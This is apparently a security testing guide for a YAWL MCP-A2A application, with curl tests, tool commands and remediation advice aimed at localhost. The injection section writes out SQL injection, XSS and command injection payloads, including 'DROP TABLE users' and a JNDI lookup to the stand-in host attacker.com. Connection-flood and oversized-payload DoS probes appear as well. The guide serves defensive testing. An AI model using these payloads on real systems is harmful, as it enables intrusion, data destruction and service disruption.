# YAWL MCP-A2A Security Testing Guide

## Overview

This guide provides detailed instructions for performing comprehensive security testing on the YAWL MCP-A2A MVP application. It includes manual testing techniques, automated tool usage, and remediation strategies.

## Quick Start

### Running Basic Security Tests

```bash
# Run the automated security test suite
./scripts/security/security-test-runner.sh

# Build and run security testing environment
cd docker/security-tester
docker-compose up --build

# From inside the container
/app/scripts/security-test-runner.sh
```

## Test Categories

### 1. Authentication Testing

#### Test Objective
Verify authentication mechanisms work correctly and cannot be bypassed.

#### Manual Test Cases

**1.1 Direct Access Testing**
```bash
# Test MCP endpoints without authentication
curl -v http://localhost:8081/mcp/sse
curl -v -X POST http://localhost:8081/mcp/message \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"tools.list"}'
```

**Expected Result**: 401 Unauthorized or connection refused

**1.2 JWT Token Testing**
```bash
# Test with valid JWT (if implemented)
curl -v -H "Authorization: Bearer valid.jwt.token" \
  http://localhost:8081/mcp/tools

# Test with invalid JWT
curl -v -H "Authorization: Bearer invalid.token" \
  http://localhost:8081/mcp/tools

# Test with malformed JWT
curl -v -H "Authorization: Bearer" \
  http://localhost:8081/mcp/tools
```

**Expected Result**: Invalid tokens should be rejected with 401

**1.3 Session Hijacking**
```bash
# Capture session cookies
curl -c cookies.txt -v -X POST http://localhost:8080/yawl/ib \
  -d "username=admin&password=YAWL"

# Attempt to reuse session
curl -b cookies.txt -v http://localhost:8081/mcp/sse
```

**Expected Result**: Session should be invalid or expired

### 2. Authorization Testing

#### Test Objective
Verify access controls are properly implemented.

#### Manual Test Cases

**2.1 Privilege Escalation**
```bash
# Access administrative endpoints
curl -v http://localhost:8080/actuator/env
curl -v http://localhost:8080/actuator/beans
curl -v http://localhost:8080/actuator/configprops
```

**Expected Result**: 401 Unauthorized or 403 Forbidden

**2.2 Cross-Tenant Data Access**
```bash
# Access data from different tenant IDs
curl "http://localhost:8081/mcp/resources/specifications?tenant_id=other"
curl "http://localhost:8081/mcp/cases?tenant_id=admin"
```

**Expected Result**: Access denied for unauthorized tenants

### 3. Input Injection Testing

#### Test Objective
Verify proper input validation and sanitization.

#### SQL Injection Testing
```bash
# Test various SQL injection payloads
PAYLOADS=(
  "' OR '1'='1' --"
  "'; DROP TABLE users; --"
  "UNION SELECT NULL, NULL --"
  "'; WAITFOR DELAY '0:0:10' --"
)

for payload in "${PAYLOADS[@]}"; do
  curl -v -X POST http://localhost:8081/mcp/message \
    -d "{\"jsonrpc\":\"2.0\",\"method\":\"yawl.launchWorkflow\",\"params\":{\"specId\":\"$payload\"}}"
done
```

**Expected Result**: All payloads should be rejected with error

#### XSS Testing
```bash
# XSS payload testing
XSS_PAYLOADS=(
  "<script>alert(1)</script>"
  "'><img src=x onerror=alert(1)>"
  "javascript:alert(1)"
  "\"'><img src=x onerror=alert(1)>"
)

for payload in "${XSS_PAYLOADS[@]}"; do
  curl -v -X POST http://localhost:8081/mcp/message \
    -d "{\"jsonrpc\":\"2.0\",\"method\":\"yawl.launchWorkflow\",\"params\":{\"name\":\"$payload\"}}"
done
```

**Expected Result**: All payloads should be escaped or rejected

#### Command Injection Testing
```bash
# Command injection payloads
CMD_PAYLOADS=(
  "$(whoami)"
  "`whoami`"
  "${jndi:ldap://attacker.com/a}"
  "&& whoami"
  "|| whoami"
)

for payload in "${CMD_PAYLOADS[@]}"; do
  curl -v -X POST http://localhost:8081/mcp/message \
    -d "{\"jsonrpc\":\"2.0\",\"method\":\"yawl.executeCommand\",\"params\":{\"cmd\":\"$payload\"}}"
done
```

### 4. Protocol Testing

#### Test Objective
Verify protocol implementations are secure.

#### JSON-RPC Testing
```bash
# Test JSON-RPC compliance
curl -v -X POST http://localhost:8081/mcp/message \
  -d '{"jsonrpc":"2.0","method":"nonexistent.method","params":{}}'

# Test version downgrade
curl -v -X POST http://localhost:8081/mcp/message \
  -d '{"jsonrpc":"1.0","method":"tools.list"}'

# Test malformed JSON
curl -v -X POST http://localhost:8081/mcp/message \
  -d 'invalid json'
```

**Expected Result**: Invalid requests should be rejected

#### SSE Testing
```bash
# Test SSE endpoint
curl -N http://localhost:8081/mcp/sse &
SSE_PID=$!

# Wait a bit, then kill
sleep 2
kill $SSE_PID 2>/dev/null
```

### 5. Denial of Service Testing

#### Test Objective
Identify potential DoS vectors.

#### Connection Testing
```bash
# Test connection limits
for i in {1..150}; do
  curl -s --max-time 1 http://localhost:8081/mcp/sse > /dev/null &
done
wait

# Check how many connections were allowed
netstat -an | grep 8081 | wc -l
```

#### Large Payload Testing
```bash
# Test large request payloads
PAYLOAD=$(printf 'A'%.0s {1..100000})
curl -v -X POST http://localhost:8081/mcp/message \
  -d "$PAYLOAD" \
  -H "Content-Type: application/json"
```

### 6. Data Exfiltration Testing

#### Test Objective
Prevent unauthorized data access.

#### Information Disclosure
```bash
# Test for sensitive information
curl -v http://localhost:8080/actuator/env | grep -i "password\|secret\|key"
curl -v http://localhost:8080/actuator/heapdump
curl -v http://localhost:8080/actuator/threaddump
```

#### Cross-Service Testing
```bash
# Test data across services
curl http://localhost:8080/actuator/metrics
curl http://localhost:8082/agents/status
curl http://localhost:8083/jsonrpc
```

## Automated Tools

### OWASP ZAP

```bash
# Start ZAP
/opt/ZAP/zap.sh -daemon

# Run active scan
zap-cli -p 8080 quick-scan http://localhost:8081

# Generate report
zap-cli -p 8080 report -o zap-report.html
```

### Burp Suite

1. Start Burp Suite Community
2. Configure browser to proxy through Burp (127.0.0.1:8080)
3. Browse the application
4. Use Intruder module for automated attacks

### sqlmap

```bash
# Test for SQL injection
sqlmap -u "http://localhost:8081/mcp/resources" \
  --data "spec=test" \
  --level=5 \
  --risk=3

# Test with specific parameters
sqlmap -u "http://localhost:8081/mcp/tools" \
  --data '{"jsonrpc":"2.0","method":"launch","params":{"id":"1"}}' \
  --level=5 --risk=3
```

## Security Metrics

### Key Metrics to Track

1. **Authentication Success Rate**: Should be 100% for valid credentials, 0% for invalid
2. **Authorization Enforcement**: All unauthorized requests should be blocked
3. **Input Validation**: All malicious payloads should be rejected
4. **Response Time**: P95 should be < 100ms for authenticated requests
5. **Error Rate**: Should be < 1% for valid requests

### Monitoring

```bash
# Monitor for suspicious patterns
tail -f /var/log/yawl/mcp-a2a.log | grep -E "(401|403|429|500)"

# Monitor resource usage
htop
df -h
free -h

# Monitor network connections
netstat -an | grep 808
lsof -i :8080
```

## Remediation

### Critical Issues

1. **Authentication Bypass**
   - Implement JWT validation on all endpoints
   - Add TLS/SSL encryption
   - Implement session management

2. **Command Injection**
   - Sanitize all user inputs
   - Use parameterized queries
   - Implement command whitelisting

### High Priority Issues

3. **Rate Limiting**
   - Implement request rate limits
   - Add IP-based restrictions
   - Implement account lockout

4. **Information Disclosure**
   - Remove sensitive endpoints from production
   - Implement proper error handling
   - Add response filtering

### Medium Priority Issues

5. **Resource Protection**
   - Add CPU time limits
   - Implement memory quotas
   - Set concurrent operation limits

## Security Checklist

### Before Deployment

- [ ] All MCP endpoints protected with authentication
- [ ] JWT tokens properly validated
- [ ] SQL injection protection verified
- [ ] XSS protection in place
- [ ] Rate limiting implemented
- [ ] TLS/SSL enabled
- [ ] Error messages sanitized
- [ ] Administrative endpoints secured

### After Deployment

- [ ] Monitor security logs daily
- [ ] Run penetration tests monthly
- [ ] Keep dependencies updated
- [ ] Monitor for new vulnerabilities
- [ ] Implement incident response plan

## References

- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP ZAP Documentation](https://www.zaproxy.org/docs/)
- [Burp Suite Academy](https://portswigger.net/web-security)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)

## Emergency Contacts

- Security Team: security@yawlfoundation.org
- Development Team: dev@yawlfoundation.org
- Incident Response: incident@yawlfoundation.org
